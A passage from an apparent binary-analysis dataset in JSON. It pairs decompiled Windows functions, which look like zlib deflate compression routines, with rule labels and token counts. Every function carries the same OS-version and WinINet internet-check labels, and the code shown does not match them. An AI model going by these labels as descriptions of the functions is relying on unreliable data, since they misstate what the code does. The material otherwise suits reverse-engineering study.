        "decompiled_code": "\nvoid fcn.0046a68c(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint32_t arg_10h;\n    \n    arg_10h = *(*(in_EAX + 0x1c) + 0x14);\n    if (*(in_EAX + 0x10) < arg_10h) {\n        arg_10h = *(in_EAX + 0x10);\n    }\n    if (arg_10h != 0) {\n        fcn.00469cb4(*(in_EAX + 0xc), *(*(in_EAX + 0x1c) + 0x10), arg_10h);\n        *(in_EAX + 0xc) = *(in_EAX + 0xc) + arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x10;\n        *piVar1 = *piVar1 + arg_10h;\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + arg_10h;\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) - arg_10h;\n        piVar1 = *(in_EAX + 0x1c) + 0x14;\n        *piVar1 = *piVar1 - arg_10h;\n        iVar2 = *(in_EAX + 0x1c);\n        if (*(iVar2 + 0x14) == 0) {\n            *(iVar2 + 0x10) = *(iVar2 + 8);\n        }\n    }\n    return;\n}\n",
        "token_count": 375
    },
    "0046a6e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0046a6e0(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX == NULL) || (in_EAX[7] == 0)) || (4 < param_2)) || (param_2 < 0)) {\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        ppiVar1 = in_EAX[7];\n        if (((in_EAX[3] == 0) || ((*in_EAX == 0 && (in_EAX[1] != 0)))) || ((ppiVar1[1] == 0x29a && (param_2 != 0x4)))) {\n            in_EAX[6] = *0x4919a8;\n            uVar3 = 0xfffffffe;\n        }\n        else if (in_EAX[4] == 0) {\n            uVar3 = 0xfffffffb;\n            in_EAX[6] = *0x4919b4;\n        }\n        else {\n            *ppiVar1 = in_EAX;\n            piVar2 = ppiVar1[9];\n            ppiVar1[9] = param_2;\n            if (ppiVar1[1] == 0x2a) {\n                ppiVar1[1] = 0x71;\n                fcn.0046a664();\n                if (ppiVar1[0x1a] != NULL) {\n                    fcn.0046a664();\n                    fcn.0046a664();\n                }\n                iVar4 = fcn.00469e1c();\n                in_EAX[0xc] = iVar4;\n            }\n            if (ppiVar1[5] == NULL) {\n                if (((in_EAX[1] == 0) && (param_2 <= piVar2)) && (param_2 != 0x4)) {\n                    uVar3 = 0xfffffffb;\n                    in_EAX[6] = *0x4919b4;\n                    goto code_r0x0046a99b;\n                }\n            }\n            else {\n                fcn.0046a68c();\n                if (in_EAX[4] == 0) {\n                    ppiVar1[9] = 0xffffffff;\n                    uVar3 = 0;\n                    goto code_r0x0046a99b;\n                }\n            }\n            if ((ppiVar1[1] == 0x29a) && (in_EAX[1] != 0)) {\n                uVar3 = 0xfffffffb;\n                in_EAX[6] = *0x4919b4;\n            }\n            else {\n                if (((in_EAX[1] != 0) || (ppiVar1[0x1c] != NULL)) || ((param_2 != NULL && (ppiVar1[1] != 0x29a)))) {\n                    param_1 = (**(ppiVar1[0x20] * 0xc + 0x4919cc))();\n                    if ((param_1 == 2) || (param_1 == 3)) {\n                        ppiVar1[1] = 0x29a;\n                    }\n                    if ((param_1 == 0) || (param_1 == 2)) {\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                        }\n                        uVar3 = 0;\n                        goto code_r0x0046a99b;\n                    }\n                    if (param_1 == 1) {\n                        if (param_2 == 0x1) {\n                            fcn.0046ca7c();\n                        }\n                        else {\n                            param_1 = 0;\n                            fcn.0046c9c0(0);\n                            if (param_2 == 0x3) {\n                                *(ppiVar1[0x10] + ppiVar1[0x12] * 2 + -2) = 0;\n                                fcn.00469ca0(ppiVar1[0x10], 0, (ppiVar1[0x12] + -1) * 2);\n                            }\n                        }\n                        fcn.0046a68c();\n                        if (in_EAX[4] == 0) {\n                            ppiVar1[9] = 0xffffffff;\n                            uVar3 = 0;\n                            goto code_r0x0046a99b;\n                        }\n                    }\n                }\n                if (param_2 == 0x4) {\n                    if (ppiVar1[6] < 1) {\n                        uVar3 = 1;\n                    }\n                    else {\n                        fcn.0046a664();\n                        fcn.0046a664();\n                        fcn.0046a68c();\n                        if (0 < ppiVar1[6]) {\n                            ppiVar1[6] = -ppiVar1[6];\n                        }\n                        if (ppiVar1[5] == NULL) {\n                            uVar3 = 1;\n                        }\n                        else {\n                            uVar3 = 0;\n                        }\n                    }\n                }\n                else {\n                    uVar3 = 0;\n                }\n            }\n        }\n    }\ncode_r0x0046a99b:\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 1195
    },
    "0046a9a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046a9a4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if ((in_EAX == 0) || (*(in_EAX + 0x1c) == 0)) {\n        return 0xfffffffe;\n    }\n    iVar1 = *(*(in_EAX + 0x1c) + 4);\n    if (((iVar1 != 0x2a) && (((iVar1 != 0x45 && (iVar1 != 0x49)) && (iVar1 != 0x5b)))) &&\n       (((iVar1 != 0x67 && (iVar1 != 0x71)) && (iVar1 != 0x29a)))) {\n        return 0xfffffffe;\n    }\n    if (*(*(in_EAX + 0x1c) + 8) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x40) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x3c) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    if (*(*(in_EAX + 0x1c) + 0x34) != 0) {\n        (**(in_EAX + 0x24))();\n    }\n    (**(in_EAX + 0x24))();\n    *(in_EAX + 0x1c) = 0;\n    if (iVar1 == 0x71) {\n        uVar2 = 0xfffffffd;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 407
    },
    "0046af00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046af00(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    uint32_t arg_10h;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint16_t uVar4;\n    uint16_t *puVar5;\n    \n    arg_10h = in_EAX[10];\n    while( true ) {\n        uVar2 = in_EAX[10] + -0x106 + arg_10h;\n        if (uVar2 < in_EAX[0x1a] || uVar2 == in_EAX[0x1a]) {\n            fcn.00469cb4(in_EAX[0xd], in_EAX[0xd] + arg_10h, arg_10h);\n            in_EAX[0x1b] = in_EAX[0x1b] - arg_10h;\n            in_EAX[0x1a] = in_EAX[0x1a] - arg_10h;\n            in_EAX[0x16] = in_EAX[0x16] - arg_10h;\n            iVar3 = in_EAX[0x12];\n            puVar5 = iVar3 * 2 + in_EAX[0x10];\n            do {\n                puVar5 = puVar5 + -1;\n                if (*puVar5 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n            puVar5 = arg_10h * 2 + in_EAX[0xf];\n            uVar2 = arg_10h;\n            do {\n                puVar5 = puVar5 + -1;\n                param_1 = *puVar5;\n                if (param_1 < arg_10h) {\n                    uVar4 = 0;\n                }\n                else {\n                    uVar4 = *puVar5 - arg_10h;\n                }\n                *puVar5 = uVar4;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        if (*(*in_EAX + 4) == 0) break;\n        iVar3 = fcn.0046abf0(param_1);\n        in_EAX[0x1c] = in_EAX[0x1c] + iVar3;\n        if (2 < in_EAX[0x1c]) {\n            uVar1 = *(in_EAX[0xd] + in_EAX[0x1a]);\n            in_EAX[0x11] = uVar1;\n            in_EAX[0x11] = (uVar1 << (in_EAX[0x15] & 0x1f) ^ *(in_EAX[0xd] + 1 + in_EAX[0x1a])) & in_EAX[0x14];\n        }\n        if (0x105 < in_EAX[0x1c]) {\n            return;\n        }\n        if (*(*in_EAX + 4) == 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 732
    },
    "0046ba50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ba50(uint param_1, int32_t *param_2)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    int32_t *piVar7;\n    ushort *puVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack24;\n    \n    iVar3 = param_2[1];\n    iVar4 = *param_2;\n    piVar7 = param_2[2];\n    iVar12 = *piVar7;\n    iVar5 = piVar7[1];\n    iVar6 = piVar7[2];\n    uVar13 = piVar7[4];\n    iStack24 = 0;\n    iVar10 = 0;\n    puVar8 = in_EAX + 0xb38;\n    do {\n        *puVar8 = 0;\n        iVar10 = iVar10 + 1;\n        puVar8 = puVar8 + 1;\n    } while (iVar10 < 0x10);\n    *(iVar4 + 2 + *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) * 4) = 0;\n    iStack36 = *(in_EAX + 0x1450) + 1;\n    piVar7 = in_EAX + 0xb58 + iStack36 * 4;\n    for (; iStack36 < 0x23d; iStack36 = iStack36 + 1) {\n        iVar10 = *piVar7;\n        uVar11 = *(iVar4 + 2 + *(iVar4 + 2 + iVar10 * 4) * 4) + 1;\n        if (uVar13 < uVar11) {\n            iStack24 = iStack24 + 1;\n            uVar11 = uVar13;\n        }\n        *(iVar4 + 2 + iVar10 * 4) = uVar11;\n        if (iVar10 <= iVar3) {\n            piVar9 = in_EAX + 0xb38 + uVar11 * 2;\n            *piVar9 = *piVar9 + 1;\n            iStack32 = 0;\n            if (iVar6 <= iVar10) {\n                iStack32 = *(iVar5 + (iVar10 - iVar6) * 4);\n            }\n            uVar2 = *(iVar4 + iVar10 * 4);\n            *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + uVar2 * (uVar11 + iStack32);\n            if (iVar12 != 0) {\n                *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) + (*(iVar12 + 2 + iVar10 * 4) + iStack32) * uVar2;\n            }\n        }\n        piVar7 = piVar7 + 1;\n    }\n    if (iStack24 != 0) {\n        do {\n            iVar12 = uVar13 - 1;\n            for (piVar9 = in_EAX + 0xb38 + iVar12 * 2; *piVar9 == 0; piVar9 = piVar9 + -1) {\n                iVar12 = iVar12 + -1;\n            }\n            piVar9 = in_EAX + 0xb38 + iVar12 * 2;\n            *piVar9 = *piVar9 + -1;\n            piVar9 = in_EAX + 0xb3a + iVar12 * 2;\n            *piVar9 = *piVar9 + 2;\n            piVar9 = in_EAX + 0xb38 + uVar13 * 2;\n            *piVar9 = *piVar9 + -1;\n            iStack24 = iStack24 + -2;\n        } while (0 < iStack24);\n        puVar1 = in_EAX + 0xb38 + uVar13 * 2;\n        for (; uVar13 != 0; uVar13 = uVar13 - 1) {\n            uVar11 = *puVar1;\n            while (piVar7 = in_EAX + 0xb58 + iStack36 * 4,  uVar11 != 0) {\n                while( true ) {\n                    iStack36 = iStack36 + -1;\n                    piVar7 = piVar7 + -1;\n                    iVar12 = *piVar7;\n                    if (iVar3 < iVar12) break;\n                    if (*(iVar4 + 2 + iVar12 * 4) != uVar13) {\n                        *(in_EAX + 0x16a4) =\n                             *(in_EAX + 0x16a4) + (uVar13 - *(iVar4 + 2 + iVar12 * 4)) * *(iVar4 + iVar12 * 4);\n                        *(iVar4 + 2 + iVar12 * 4) = uVar13;\n                    }\n                    uVar11 = uVar11 - 1;\n                    if (uVar11 == 0) goto code_r0x0046bc3d;\n                }\n            }\ncode_r0x0046bc3d:\n            puVar1 = puVar1 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 1230
    },
    "0046bcc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bcc0(uint param_1, int16_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    int16_t *piVar5;\n    char cVar6;\n    uchar *puVar7;\n    int16_t *piVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int16_t *piStack20;\n    \n    piVar8 = NULL;\n    piVar3 = *param_2;\n    iVar9 = *param_2[2];\n    puVar7 = in_EAX + 0x1454;\n    iVar10 = *(param_2[2] + 0xc);\n    piStack20 = 0xffffffff;\n    *(in_EAX + 0x144c) = 0;\n    *(in_EAX + 0x1450) = 0x23d;\n    piVar5 = piVar3;\n    if (0 < iVar10) {\n        do {\n            if (*piVar5 == 0) {\n                piVar5[1] = 0;\n            }\n            else {\n                *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n                *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar8;\n                *puVar7 = 0;\n                piStack20 = piVar8;\n            }\n            piVar8 = piVar8 + 1;\n            puVar7 = puVar7 + 1;\n            piVar5 = piVar5 + 2;\n        } while (piVar8 < iVar10);\n    }\n    while (*(in_EAX + 0x144c) < 2) {\n        if (piStack20 < 2) {\n            piVar5 = piStack20 + 1;\n            piStack20 = piVar5;\n        }\n        else {\n            piVar5 = NULL;\n        }\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + 1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x144c) * 4) = piVar5;\n        piVar3[piVar5 * 2] = 1;\n        *(in_EAX + 0x1454 + piVar5) = 0;\n        *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + -1;\n        if (iVar9 != 0) {\n            *(in_EAX + 0x16a8) = *(in_EAX + 0x16a8) - *(iVar9 + 2 + piVar5 * 4);\n        }\n    }\n    param_2[1] = piStack20;\n    iVar9 = *(in_EAX + 0x144c) >> 1;\n    if (iVar9 < 0) {\n        iVar9 = iVar9 + ((*(in_EAX + 0x144c) & 1) != 0);\n    }\n    for (; 0 < iVar9; iVar9 = iVar9 + -1) {\n        fcn.0046b95c();\n    }\n    do {\n        iVar9 = *(in_EAX + 0x144c);\n        iVar4 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x144c) = *(in_EAX + 0x144c) + -1;\n        *(in_EAX + 0xb5c) = *(in_EAX + 0xb58 + iVar9 * 4);\n        fcn.0046b95c();\n        iVar9 = *(in_EAX + 0xb5c);\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar4;\n        *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n        *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = iVar9;\n        piVar3[iVar10 * 2] = piVar3[iVar9 * 2] + piVar3[iVar4 * 2];\n        uVar2 = *(in_EAX + 0x1454 + iVar9);\n        puVar1 = in_EAX + 0x1454 + iVar4;\n        if (uVar2 < *puVar1 || uVar2 == *puVar1) {\n            cVar6 = *(in_EAX + 0x1454 + iVar4);\n        }\n        else {\n            cVar6 = *(in_EAX + 0x1454 + iVar9);\n        }\n        *(in_EAX + 0x1454 + iVar10) = cVar6 + '\\x01';\n        piVar3[iVar9 * 2 + 1] = iVar10;\n        piVar3[iVar4 * 2 + 1] = iVar10;\n        *(in_EAX + 0xb5c) = iVar10;\n        iVar10 = iVar10 + 1;\n        fcn.0046b95c();\n    } while (1 < *(in_EAX + 0x144c));\n    *(in_EAX + 0x1450) = *(in_EAX + 0x1450) + -1;\n    *(in_EAX + 0xb58 + *(in_EAX + 0x1450) * 4) = *(in_EAX + 0xb5c);\n    fcn.0046ba50();\n    fcn.0046bc50();\n    return;\n}\n",
        "token_count": 1309
    },
    "0046c664": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046c664(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint8_t *puVar2;\n    \n    fcn.0046bed0();\n    fcn.0046bed0();\n    fcn.0046bcc0();\n    iVar1 = 0x12;\n    puVar2 = 0x4921e2;\n    do {\n        if (*(in_EAX + 0xa7a + *puVar2 * 4) != 0) break;\n        iVar1 = iVar1 + -1;\n        puVar2 = puVar2 + -1;\n    } while (2 < iVar1);\n    *(in_EAX + 0x16a4) = *(in_EAX + 0x16a4) + iVar1 * 3 + 0x11;\n    return;\n}\n",
        "token_count": 189
    },
    "0046d020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d020(int32_t param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int16_t iVar8;\n    uint32_t uVar9;\n    uint32_t uStack32;\n    \n    uStack32 = 0;\n    if (*(in_EAX + 0x169c) != 0) {\n        do {\n            uVar7 = *(*(in_EAX + 0x16a0) + uStack32 * 2);\n            uVar9 = *(*(in_EAX + 0x1694) + uStack32);\n            uStack32 = uStack32 + 1;\n            if (uVar7 == 0) {\n                uVar7 = *(param_2 + 2 + uVar9 * 4);\n                if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + uVar9 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + uVar9 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n                }\n            }\n            else {\n                uVar6 = *(uVar9 + 0x4923e3);\n                uVar5 = *(param_2 + 0x406 + uVar6 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_2 + 0x404 + uVar6 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) =\n                         *(in_EAX + 0x16b4) | *(param_2 + 0x404 + uVar6 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar6 * 4 + 0x491a78);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar6 * 4 + 0x4920a8);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n                uVar9 = uVar7 - 1;\n                if (uVar9 < 0x100) {\n                    uVar1 = *(uVar7 + 0x4921e2);\n                }\n                else {\n                    uVar1 = *((uVar9 >> 7) + 0x4922e3);\n                }\n                uVar7 = uVar1;\n                uVar5 = *(param_1 + 2 + uVar7 * 4);\n                if (0x10 - uVar5 < *(in_EAX + 0x16b8)) {\n                    uVar2 = *(param_1 + uVar7 * 4);\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n                    iVar3 = *(in_EAX + 0x14);\n                    *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                    *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n                    *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = (uVar5 - 0x10) + *(in_EAX + 0x16b8);\n                }\n                else {\n                    *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_1 + uVar7 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                    *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar5;\n                }\n                iVar3 = *(uVar7 * 4 + 0x491aec);\n                if (iVar3 != 0) {\n                    uVar9 = uVar9 - *(uVar7 * 4 + 0x49211c);\n                    iVar8 = uVar9;\n                    if (0x10 - iVar3 < *(in_EAX + 0x16b8)) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n                        iVar4 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (uVar9 & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = iVar3 + -0x10 + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar8 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + iVar3;\n                    }\n                }\n            }\n        } while (uStack32 < *(in_EAX + 0x169c));\n    }\n    uVar7 = *(param_2 + 0x402);\n    if (0x10 - uVar7 < *(in_EAX + 0x16b8)) {\n        uVar2 = *(param_2 + 0x400);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar2 << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4);\n        iVar3 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar3) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = uVar2 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = (uVar7 - 0x10) + *(in_EAX + 0x16b8);\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(param_2 + 0x400) << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar7;\n    }\n    *(in_EAX + 0x16b0) = *(param_2 + 0x402);\n    return;\n}\n",
        "token_count": 2959
    },
    "0046d4e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d4e0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    piVar1 = in_EAX + 0x24;\n    do {\n        if (*piVar1 != 0) break;\n        iVar2 = iVar2 + 1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 < 9);\n    if (iVar2 == 9) {\n        iVar2 = 0xe;\n        piVar1 = in_EAX + 0x32;\n        do {\n            if (*piVar1 != 0) break;\n            iVar2 = iVar2 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 < 0x20);\n    }\n    *(*in_EAX + 0x2c) = iVar2 == 0x20;\n    return;\n}\n",
        "token_count": 216
    },
    "0046d5bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d5bc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) < 9) {\n        if (0 < *(in_EAX + 0x16b8)) {\n            iVar1 = *(in_EAX + 0x14);\n            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n            *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        }\n    }\n    else {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n    }\n    *(in_EAX + 0x16b4) = 0;\n    *(in_EAX + 0x16b8) = 0;\n    return;\n}\n",
        "token_count": 318
    },
    "0046d624": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
